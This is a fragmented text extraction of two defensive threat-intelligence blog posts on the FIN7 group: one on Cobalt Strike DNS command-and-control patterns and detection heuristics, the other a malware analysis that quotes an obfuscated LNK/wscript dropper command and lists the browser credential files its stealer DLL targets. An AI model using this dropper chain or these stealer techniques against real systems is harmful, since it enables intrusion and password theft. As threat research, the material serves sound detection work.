text:
Tracking Actor Patterns (Part 1) 




Security / July 26, 2017

Footprints of Fin7:
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Tracking Actor Patterns (Part 1)

 ATR   Justin Warner   Stephen Hinck  					






The following blog post and research was originally published by ICEBRG prior to being acquired by Gigamon on July 24th, 2018.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The 2017 Verizon DBIR Report states that 73 percent of breaches in 2016 were financially motivated and span a number of different industries and financial targets.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Since 2015, a financially motivated threat group known as FIN7 (also referred to as the Carbanak Group) has emerged from the shadows and has been highlighted in a number of different incidents.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This group is a moderately sophisticated and persistent adversary that has targeted various industries.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In early 2017, Gigamon Applied Threat Research (ATR) detected and observed FIN7 activity and spent some time profiling various aspects of their operations.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This analysis showed that, as many others have reported, FIN7 is not just a capable threat group that utilizes “off the shelf” capabilities to accomplish their objectives, but also adapts to meet the challenges of the environment in which they are operating.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: It is our hope that this information will help others dealing with the threat actors and also shine light on some recommended capabilities for response teams to better understand the mindset of their adversaries.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This is part one of a two-part blog series detailing the team’s engagements with FIN7 throughout early 2017.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Part one of this series focuses on the network command and control techniques used by the actors.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In these posts, Gigamon ATR will not disclose IOCs from the campaigns, but rather focus on specific patterns that may help identify attacker activity.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
(Part two)
FIN7 Network Command and Control (C2) FIN7 Network
While it is widely believed that the use of custom tools is a characteristic of sophisticated threat actor groups, open source and commercially available tools are easily obtained, easy to hide, and, due to their widespread legitimate use, make attribution difficult.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: FIN7 makes heavy use of these tools, involving a number of techniques throughout their operations.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Operational Patterns
Gigamon ATR observed FIN7 using several types of communications to maintain a foothold in their target environment, rotating their infrastructure throughout the operation in order to stay one step ahead of response and remediation efforts.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: For their primary command and control (C2), FIN7 used Cobalt Strike’s DNS C2 as their method of maintaining access inside target environments.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Two separate C2 servers wereused during the observed periods: one used heavily during initial access and a second one used more during post-exploitation activities.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The authoritative DNS servers for the malicious domains were geographically distributed, but all hosted within the same low-reputation Virtual Private Server (VPS) provider.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The secondary C2 method leveraged a different encrypted communication channel.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Infrastructure for the secondary C2 method was also hosted on the same geographically disparate low-reputation VPS provider.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: During the incident, Gigamon ATR observed that the attackers were consistently active between 08:00 and 23:00 GMT, with peak activity at 17:00 GMT and with minimal activity outside of that window.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This time window is not intended to perform any sort of attribution but was useful when planning and coordinating phases of the response effort.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 1: Actor DNS C2 activity broken out by hour.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Using these timelines, Gigamon ATR was able to identify FIN7 employing different C2 techniques based on their operational patterns.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Before concluding operations for the day, the adversary would set their callback times to one hour, and change the mode of their communications to use A resource records (instead of TXT records).
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This change appeared to be an attempt by the actors to maintain a lower profile by using more natural queries in the environment.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Further, the threat actors would spawn a secondary C2 component during their off-hour periods in an apparent attempt to maintain access should the DNS C2 be detected.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: We will explore each of these techniques further in the following sections.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Cobalt Strike DNS C2
DNS C2 leverages malicious DNS TXT and A RRs (resource records) queries which traverse standard recursive DNS channels and terminate at an attacker’s authoritative DNS server.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The traversal of standard DNS channels make this technique effective for highly controlled environments where restrictive firewall, web filter or proxy policies are enforced; for example, in point of sale (POS) networks in the retail and hospitality sector, as well as other high-security financial transaction environments.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 2: Example flow of DNS C2 traffic.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The specific C2 capabilities of Cobalt Strike are outlined in various blogs on their website.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: It should be noted that Cobalt Strike allows for modification of several aspects of the DNS C2 channel through the Malleable C2 option.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In the observed operations, FIN7 used the default communication settings present in Cobalt Strike without modification.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This decision (or lack thereof) could be indicative of lack of tool knowledge, or a lack of necessity to do anything more to accomplish their objectives.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The communications schema and components leveraged in the attack are broken out below.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: During the initial exploitation, and throughout the lateral spread attack phases, the actors used PowerShell scripts to deploy DNS TXT record stagers into memory.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: During execution, PowerShell would make iterative DNS TXT queries, which would return encrypted data to be concatenated and then executed in memory.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
These queries followed a pattern matching:
aaa.stage.[encryptedstage].MaliciousDomain.com, baa.stage.[encryptedstage].MaliciousDomain.com, caa.stage.[encryptedstage].MaliciousDomain.com
Emerging Threats Pro has a signature for this part of the Cobalt Strike DNS C2 chain (SID 2809850) that should provide basic alerting.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By monitoring for the aaa.stage.[encryptedstage].MaliciousDomain.com pattern, Gigamon ATR was able to detect attacker movement in real time, prior to confirmed control of the victim host, enabling immediate analysis of the new activity.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 3: The DNS TXT record staging process for Cobalt Strike used by FIN7.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: After staging, the attacker would shift to the use of DNS A resource records.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: When idle, the malware would make requests to the attacker-controlled domain with a pattern matching [SessionID].MaliciousDomain.com.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By tracking the session IDs in observed requests, Gigamon ATR could uniquely identify compromised hosts, and alert on any possible new compromises by identifying new session IDs, even without direct visibility of hosts in certain network enclaves.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Additionally, using these session IDs, Gigamon ATR tracked the volume of activity per ID to determine which hosts appeared central to the operations of the attacker.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By default, the C2 server would respond to the aforementioned A record requests with ‘0.0.0.0’ when the malware should remain inactive.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By tracking DNS responses of ‘0.0.0.0’, Gigamon ATR detected new attacker infrastructure even when not discovered by other heuristics, as well as tracked periods of attacker inactivity to further cement a profile of FIN7’s operational habits.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: It should be noted that several non-malicious domains perform similar actions and this monitoring requires additional analysis for verification.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 4: Idle DNS A Record queries and answers from Cobalt Strike used by FIN7.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: When tasked with commands by the attackers that had results or output, the A resource record requests would use a pattern matching post.[EncryptedData].[RandomValue].MaliciousDomain.com.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By monitoring for this pattern, Gigamon ATR was able to observe data leaving the environment and, although encrypted, make rough determinations on approximate volume of data loss.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: DNS A record C2 results in a slower data channel due to limitations in the DNS specification and hampers the ability to conduct large scale data exfiltration.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 5: DNS queries indicating the exfiltration of information by Cobalt Strike.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: While the patterns presented above are specific to Cobalt Strike’s default configuration of DNS C2, aspects of this activity can be abstracted to allow for general purpose detection of malware using DNS command and control methods.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The following characteristics may identify suspicious DNS behavior (note: multiple legitimate solutions use similar schemes to communicate.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
These behaviors, like most heuristic-based analytics, will likely have high initial false positive rates, and require tuning to each environment):
Large TXT or A resource record requests with a high entropy and a low TTL valueA record requests that receive an answer of “0.0.0.0” or “127.0.0.1” on a repeating or regular scheduleSignificant number of requests to the same suspicious domain in short bulk time periods.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Domains might be considered suspicious based on their age, rarity in relation to other observed networks, the number of assets communicating to the domain and other such environment-specific correlations
DNS Domain Configuration
One unique aspect of the observed FIN7 infrastructure is the configuration pattern of their C2 domain.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The actors use a primary domain that remains parked and setup subdomains with the pattern [random hostname][1-5] (ie. www1) off of the second-level domain.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: The Cobalt Strike malware will attempt to access these subdomains in a rotational pattern.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: FIN7 likely uses this structure as a method of surviving mitigation activities in the case their target takes action against a single subdomain.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Alternate Command and Control
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In our observations, it is not uncommon for network defense teams to hone in on a specific threat involved in an incident, and tailor detection around known intelligence.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This behavior presents a risk by potentially resulting in a failure to identify other unobserved attacker TTPs; as the saying goes, “You only know what you know.”
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Gigamon ATR uses network-wide visibility to not only detect previously known patterns or IOCs, but also to enable analysts to hunt for new or shifting TTPs.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Outside of FIN7’s operational hours, Gigamon ATR observed the actors spawning additional connections from compromised assets to the same low-reputation VPS provider used for DNS C2.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This encrypted connection used TCP with a destination port of 443, but was not standard TLS or SSL.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This non-standard traffic, when combined with reuse of similar network space, enabled Gigamon ATR to quickly identify and track the activity.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: These long-duration connections contained low packet sizes, approximately 90 bytes, likely a simple heartbeat for connection keep alive.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: Figure 6: Sample of encrypted C2 patterns.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Lateral Spread and Network Exploration
Throughout our engagements with FIN7, Gigamon ATR observed heavy use of compromised credentials, specifically domain administrator accounts, to move throughout the environment.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Notably, FIN7 would frequently use the psexec_psh command within Cobalt Strike, which uses the RPC Service Controller protocol to create a service on a remote host with the binary path set to execute a malicious PowerShell command.
Figure 7: Service controller calls for psexec_psh.
Figure 8: An abridged value of the binary path for the new service.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: FIN7 showed little regard for operational security (OpSec) in their lateral spread, nor caution around key assets in the environment.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: While it appeared as though the access to payment information was the key focus of the operations, Gigamon ATR observed the group constantly exploring other enclaves of the target environment.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In one instance, Gigamon ATR observed the threat actors pivot from a remote POS environment to compromise a domain controller, then from the domain controller to assets in other corporate subnets.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By monitoring flow data for key assets, Gigamon ATR detected abnormalities originating from compromised remote locations and identified odd directionality involved with credential use.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text:
Conclusion
Throughout our engagements with FIN7, it became clear that while certain components of their operations were automated, the large majority of their activities appeared to be interactive in nature.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: When dealing with an interactive adversary such as this, traditional steps of the incident response process can be painstaking and require additional coordination or effort.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In contrast to automated malware infections, interactive threat actors may detect and respond to containment actions, modify TTPs to avoid detection, and work to stay ahead of the response team’s decision-making processes.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In spite of this challenge, profiling and monitoring an interactive adversary allows defenders to gain insight into the attacker’s thought processes, procedures and ultimately the patterns of their behaviors and activity.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: By modeling and recognizing those patterns, understanding why the adversary performs certain actions, and knowing how to line up response to outperform an interactive actor, responders can complete thorough and effective mitigations of this activity.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: It is easy to surrender to passive disengaged monitoring when dealing with encrypted command and control protocols, but so much can be gained from black-box analysis of the patterns in the protocol.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In these engagements, Gigamon ATR was able to profile phases of tactical action and track the adversary by understanding the specifics of their C2 protocols.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: We hope that this information acts a good resource for those dealing with FIN7, as well as other unknown threats in their environment.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: In the second part of the series, Gigamon ATR discusses the end goal of FIN7, and presents technical details of their financial compromise capabilities.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: To learn more about ATR, please visit www.gigamon.com/research/applied-threat-research-team.html.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

text: This two-part blog series is a joint research post by Gigamon ATR and PwC. Part two can be found here.
source: Footprints of Fin7_ Tracking Actor Patterns (Part 1) - Gigamon Blog.html

FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks


By 
Edmund Brumaghin



            Wednesday, September 27, 2017 13:38
        


                                Threats
                            




This post was authored by Michael Gorelik and Josh ReynoldsExecutive
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Summary Throughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged by the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the financial, hospitality, and medical industries.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This document is used in phishing campaigns to execute a series of scripting languages containing multiple obfuscation mechanisms and advanced techniques to bypass traditional security mechanisms.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The document contains messages enticing the user to click on an embedded object that executes scripts which are used to infect the system with an information stealing malware variant.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This malware is then used to steal passwords from popular browsers and mail clients which are sent to remote nodes that are accessible to the attackers.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: These advanced mechanisms and the information stealing malware will be discussed in detail.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: We will also review a number of static and dynamic detection mechanisms used in the AMP for Endpoints and Threat Grid product lines to detect these document families.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Introduction On June 9th, 2017 Morphisec Labpublished a blog post detailing a new infection vector technique using an RTF document containing an embedded JavaScript OLE object.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: When clicked it launches an infection chain made up of JavaScript, and a final shellcode payload that makes use of DNS to load additional shellcode from a remote command and control server.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In this collaboration post with Morphisec Lab and Cisco's Research and Efficacy Team, we are now publishing details of this new document variant that makes use of an LNK embedded OLE object, which extracts a JavaScript bot from a document object, and injects a stealer DLL in memory using PowerShell.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The details we are releasing are to provide insight into attack methodologies being employed by sophisticated groups such as FIN7 who are consistently changing techniques between attacks to avoid detection, and to demonstrate the detection capabilities of the AMP for Endpoints and Threat Grid product lines.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This is relevant to the constantly changing threats that are affecting multiple types of industries on a daily basis.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Infection Vector
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The dropper variant that we encountered makes use of an LNK file to execute wscript.exe with the beginning of the JavaScript chain from a word document object:C:\Windows\System32\cmd.exe..\..
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: \Windows\System32\cmd.exe /C
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: set x=wsc@ript /e:
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: js@cript %HOMEPATH%\md5.txt & echo try{w=GetObject("","Wor"+"d.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Application");this[String.fromCharCode(101)+'va'+'l'](w.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: ActiveDocument.Shapes(1).TextFrame.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: TextRange.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Text);}catch(e){}; >%HOMEPATH%\md5.txt & echo %
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: x:@=%|cmd
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This chain involves a substantial amount of base64 encoded JavaScript files that make up each component of the JavaScript bot.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: It also contains the reflective DLL injection PowerShell code to inject an information stealing malware variant DLL which will be discussed further.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: JavaScript ComparisonsClustering Decoded JavaScript Functionality
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: A single one of these documents can produce as many as 40 JavaScript files.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In order to identify similar techniques, we decided to use entropy of a given JavaScript file, and the base64 decoding depth to cluster files within a scatter plot with theggplot andggiraph R libraries.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Before we demonstrate our analysis results, we will explain the values used for plotting and clustering of the JavaScript files.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Base64 Encodings
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The majority of the JavaScript obfuscation is nested base64 encodings.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Base64 is a binary to text encoding scheme which can be used to represent any type of data.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In the case of these documents it is used to encode JavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by traditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The base64 blobs are hardcoded, or comma separated, which are then concatenated and decoded making up the next JavaScript code to be executed.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text:
BodyPart;
    bp.

text:
ContentTransferEncoding = "base64";
    bp.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text:
ReadText;
}This is then evaluated using an obfuscated function invocation, E.G:MyName.getGlct()[String.fromCharCode(101)+'va'+'l'](b64dec(energy));These base64 decoding steps lead to various execution branches of JavaScript bot functionality, and the injection of a stealer DLL into memory:Figure 1: Detailed Document Infection Chain Using JavaScript and DLL InjectionJavaScript Entropy Entropy involves the calculation of disorder and uncertainty within a given amount of data.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In this case, we are interested in associating extracted JavaScript files based on this calculation, since variations of these documents contain similar functionality, but employed obfuscation mechanisms makes clustering them difficult.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html
FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Scatter Plot for Clustering & JavaScript Functionality We began with an initial set of documents which did not contain a dropper DLL.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: We then calculated the amount of base64 decoding required to produce each file (Y axis) and calculated their respective entropy (X axis).
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: We then reviewed each scatter plot grouping and labeled their respective functionality in red:Figure 2: Scatter plot using entropy and base64 decoding depthThere are a number of conclusions from the scatter plot:The higher depth of base64 decoding shows more interesting functionality (to be expected)The bot functionality and C2 contact JavaScript is within multiple sets of files at close decoding depths and entropyThe task scheduling functionality vary in depth and entropy (two separate cases)
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: We then applied the same technique to the second generation of documents which ship an entire base64 encoded and compressed DLL:Figure 3: Scatter plot of PowerShell DLL
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: documentsThe outliers are the decoded DLLs and XML task files.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: When these components are removed from the scatter plot (leaving only JavaScript) we see similar clusters to the first generation of documents:Figure 4: Modified Plot of PowerShell DLL DocumentsBased on the number of clusters and range of entropy we see that this generation of documents contain more files with varying functionality and depth.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This plotting technique also provides a method of identifying new functionality by showing outliers, such as the labeled PS Outlier which contains an array of encoded PowerShell bytes rather than a blob that provides the final PowerShell for DLL injection:Figure 5: Identified New PowerShell Functionality Due to Entropy OutlierJavaScript Obfuscation Changes
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Once similar functionality has been clustered, the changes made between generated documents become apparent.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Variable names and GUID paths are changed:Figure 6: Variables and Path GUID JS
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: ChangesThis functionality also highlights an interesting obfuscation mechanism that some emulation engines may ignore.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The function body of the evaluated JavaScript appears to be within a multi-line comment, however, in reality this is evaluated as a multi-line string.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This can be seen below when tested in Chrome's scripting console:Figure 7: JavaScript Multi-Line Comment String ObfuscationFunctions are re-ordered:Figure 8: Reordered Function ExampleCommand and Control addresses are changed:Figure 9: Changed Command and Control AddressesVarying base64 encoding depths, which can be identified using our scatter plot, such as the PowerShell write and execution functionality:Figure 10: PowerShell Write and Execute Functionality at Different Base64
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Decoding DepthsWhich when compared vary in decoding depth but are the same functionality:Figure 11: Code Comparison PowerShell Write and Execute FunctionalityStealer DLLRecovering the DLL  One of the final components of these JavaScript 'decoding chains' is a PowerShell reflective DLL injection script which contains copy pasted functions fromPowersploit's Invoke-ReflectivePEInjection.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The DLL is de-obfuscated by decoding the base64 blob and uses IO.Compression.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: DeflateStream to decompress the resulting bytes.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In order to recover the DLL we can simply write the decompressed bytes to disk using [io.file]::WriteAllBytes.Figure 12: PowerShell stream decompression and writing DLL to diskFigure 13: Copy-Pasted PowerSploit Invoke-ReflectivePEInjection CodeStealer DLL Functionality
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: We wrote a blog post about the H1N1 dropper in August 2016, whichreferenced a string de-obfuscation script to handle multiple 32-bit value XOR, ADD, and SUB string obfuscation techniques.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This script is able to handle similar functionality in this stealer DLL:Figure 14: Firefox String DecodingImport hashing functionality involves resolving the export table for a given DLL (common for packers/malware):Figure 15: PowerShell Injected DLL Hashing Functionality PE OffsetsThen using XOR and ROL algorithm over given export values to compare against given hashes for exports to resolve:Figure 16: PowerShell Injected DLL Hashing AlgorithmThis DLL also contains similar stealer functionality, E.G the decryption of Intelliform data using CryptUnprotectData by hashing cached URLs:Figure 17:
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: PowerShell Injected DLL Intelliform Data StealingThis binary also contains Outlook and Firefox stealer functionality and the ability to steal login information from Google Chrome, Chromium, forks of Chromium and Opera browsers that will be discussed in the next section.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Chrome, Chromium and Opera Credential Stealing  The Chrome, Chromium, Chromium forks and Opera credential stealing functionality opens the [Database Path]\Login Data sqlite3 database, reads the URL, username, and password fields, and calls CryptUnprotectData to decrypt user passwords.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: The following paths are checked for this database under %APPDATA%, %PROGRAMDATA%, and %LOCALAPPDATA%:\Google\Chrome\User Data\Default\Login Data\Chromium\User
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Data\Default\Login Data\MapleStudio\ChromePlus\User Data\Default\Login Data\YandexBrowse\User Data\Default\Login Data\Nichrom\User Data\Default\Login Data\Comodo\Dragon\User Data\Default\Login Data
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: Although Opera is not a fork of Chromium, the newest version has credentials with the same implementation under the path: \Opera Software\Opera Stable\Login DataStolen Data Command and Control
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: In addition to the JavaScript bot functionality, the stolen data is dumped to %APPDATA%\%USERNAME%.ini and sets the file creation time to be that of ntdll.dll.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: This data is read and encrypted using the SimpleEncrypt function, which as their name implies, is a simple substitution cipher:Figure 18: Command and Control Data Substitution CipherThis is then POSTed to a hardcoded command and control addresses, including the Google Apps Script hosting service (also notice the alfIn variable declaration which is the alphabet used for the substitution cipher):Figure 19: Command and Control Data Exfiltration JavaScript FunctionalityThis is again using the comment block evasion technique.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: AMP Coverage  The AMP for Endpoints and Threat Grid product lines are ideal for dealing with this threat, as they can use both static and dynamic activity to detect malicious activity.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

text: AMP Threat Grid Without clicking on the embedded OLE object within the document Threat Grid can provide insight into possible malicious activity using static attributes alone.
source: FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks.html

